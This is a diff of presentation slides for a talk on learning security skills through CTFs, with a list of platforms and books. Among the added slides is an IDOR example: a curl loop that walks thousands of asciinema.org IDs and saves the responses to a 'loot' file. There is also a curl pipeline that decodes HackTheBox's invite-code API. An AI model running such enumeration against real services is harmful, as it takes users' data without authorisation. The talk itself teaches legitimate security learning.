@@ -5,59 +5,96 @@ class: center, middle, inverse
 ---
 layout: false
 class: center, middle
-Anyone who stops learning is old, whether at twenty or eighty. 
-Anyone who keeps learning stays young. 
-The greatest thing in life is to keep your mind young.
 
--- Henry Ford
+## Sometimes you win, sometimes you learn
+.footnote[-- Abraham Lincoln, probably.]
 
 ---
 class: center, middle, inverse
 # Getting Started
 ### [Understanding How You Learn]
+
 ---
-## Different Learning Styles
+.left-column[
+# Different Learning Styles
+]
+
+.right-column[
+## Test Case: IDOR on asciinema.org
+]
 
 ???
-## Basics
-Learning how DNS works
+## Example problem: IDOR on asciinema
+
+#### Basics
+
 Learning the HTTP Spec
 
 There's always time to come back and learn this.
 In fact, you'll need to if you want to 'LEVEL'
 
-## Practical Application First
+#### Practical Application First
 This one is me. I want to learn things that help
 me solve problems directly in front of me.
 
-## Answers First
+#### Answers First
 If I get absolutely stuck, I come here
 
 
 --
-## Basics First?
+.right-column[
+### Basics First?
+]
 
 --
-## Practical Application First?
+.right-column[
+* RFC 2616  -  Hypertext Transfer Protocol
+* [REST] Roy Fielding's dissertation "Architectural Styles and the Design of Network-based Software Architectures" 
+]
 
 --
-## Answer First?
+.right-column[
+### Practical Application First?
+]
+
+--
+.right-column[
+```sh
+for id in $(seq 1000 9999); do 
+  curl -sL https://asciinema.org/i/${id} >> dump.loot
+done
+```
+]
+
+--
+.right-column[
+### Answer First?
+]
 
 ---
 class: center, middle
 ## Learn Skills, Not 'Hacking'
 
 ???
+
+Math => Nuclear Warfare
 Pico CTF is a beginner's CTF platform by Carnegie Melon.
 
 A lot of the challenges are self contained lessons, including
 all the necessary resources to arrive at an answer
+
 --
 ### PicoCTF
 ---
 class: center, middle
 
 ## Regardless of Style, Understand your Tools
+
+--
+a.k.a `man $tool` and `--help` all the things!
+
+--
+
  http://overthewire.org/wargames/
 
 ???
@@ -84,14 +121,11 @@ class: center, middle, inverse
 --
 
 # Find Ongoing CTFs
-  - HackTheBox
+  - HackTheBox.eu
   - CTF Archives
 
 ---
-# Finding A Team
-
---
-* Going Solo
+# Social Learning
 
 --
 * Live Events
@@ -100,23 +134,44 @@ class: center, middle, inverse
 * Communities
   - Meetup.com
   - NetSecFocus Mattermost - chat.netsecfocus.com
-  - https://zerodays.ie
+  - DC201 or other local DefCon groups
 
 ---
 class: center, middle, inverse
 # Learning Doesn't Stop With the Flag
 ---
 
-## How many ways can you explain it?
+.left-column[
+## Keep it Going!
+
+]
+.right-column[
+### How many ways can you explain it?
+]
+--
+.right-column[
+- Write it up!
+]
+--
+.right-column[
+### How many ways can you solve it?
+]
+--
+.right-column[
+- Are there other vectors?
+- What about a different exploit?
+]
 
 --
-## How many ways can you solve it?
+
+.right-column[
+### How would you solve this without tool X?
+]
 
 --
-## How would you solve this without tool X?
-
---
-## How would I automate this?
+.right-column[
+### How would I automate this?
+]
 ???
 This one is my favorite
 ---
@@ -125,53 +180,127 @@ class: center, middle, inverse
   https://hackthebox.eu/invite
 
 ---
+class: center, middle, inverse
+# Dogfood
+  https://hackthebox.eu/invite
+
+---
+# Explain it
+
+After inspecting the network traffic, some obfuscated code was found.
+
+The code brought our attention to a function in the global scope, `makeInviteCode()`
+
+This function POSTs to endpoint `/how/to/generate/invite` which return some encoded JSON.
+
+Upon decoding, we're instructed to POST to another endpoint. The response data is the encoded
+invite code.
+
+---
+
+# How Else Can We Solve it?
+
+* Use BURPSuite to see calls that are made
+* Manually inspect all non-standard globally define functions
+
+--
+
+# What If We Can't Use Postman?
+
+* BURPsuite
+* curl
+* Python Requests
+* Ruby Net::HTTP
+
+---
+class: middle
+
+# AUTOPWN!!
+
+```bash
+# API Endpoint Information Disclosure
+1  curl -sL -X POST \
+2    'https://www.hackthebox.eu/api/invite/how/to/generate' \
+3    | jq '.data.data' \ # pull data.data property from resulting json
+4    | tr -d '"' \       # delete all instances of the "
+5    | base64 -d         # decode base64
+
+#> In order to generate the invite code, 
+#> make a POST request to /api/invite/generate%
+
+
+# Call 'hidden' endpoint
+6  curl -sL -X POST \
+7    'https://www.hackthebox.eu/api/invite/generate' \
+8    | jq -r '.data.code' \ # I learned about -r making this slide!
+9    | base64 -d
+
+```
+
+---
+
 class: center, inverse, middle
 # Resources
 ???
 So many resources, but I'm only going to list a minimun so as to not overwhelm
 ---
-.left-column[
-# CTFs
-]
-.right-column[
-- https://csaw.engineering.nyu.edu/
-- https://picoctf.com/
-- https://microcorruption.com/login
-- https://ctftime.org
-]
+class: middle
+# CTF Events and Exercises
+
+### NYU CTF Competitions - https://csaw.engineering.nyu.edu/
+
+### CMU PPP-written challenges - https://picoctf.com/
+
+### Embedded Security CTF - https://microcorruption.com/login
+
+### Global CTF Leaderboards - https://ctftime.org
 
 ---
-.left-column[
+class: right middle
 # Online Resources
-]
-.right-column[
-- https://vulnhub.com - Walkthroughs
-- https://youtube.com/ippsec
-]
+
+### Vulnerable machines and walkthroughs
+
+https://vulnhub.com
+
+### Retired HackTheBox machines
+
+https://youtube.com/ippsec
 
 ---
+class: middle
 .left-column[
 # Topics
 ]
 .right-column[
-**Reverse Engineering**
-  - Practical Reverse Engineering
-  - The IDA Pro Book
+**Reverse Engineering** - Practical Reverse Engineering
+]
+--
+.right-column[
+**Scripting** - Violent Python
+]
+--
 
-**Scripting**
-  - Violent Python
+.right-column[
+**Web** - Web Application Hackers Handbook
+]
 
-**Web**
-  - Web Application Hackers Handbook
+--
 
-**Crypto**
-  - Applied Cryptography
+.right-column[
+**Crypto** - Applied Cryptography
+]
 
-**Binary Exploitation**
-  - Hacking: The Art of Exploitation
+--
 
-**All-In-One**
-  - https://trailofbits.github.io/ctf/
+.right-column[
+**Binary Exploitation** - Hacking: The Art of Exploitation
+]
+
+--
+
+.right-column[
+**All-In-One** - https://trailofbits.github.io/ctf/
 ]
 ---
 class: center, inverse, middle
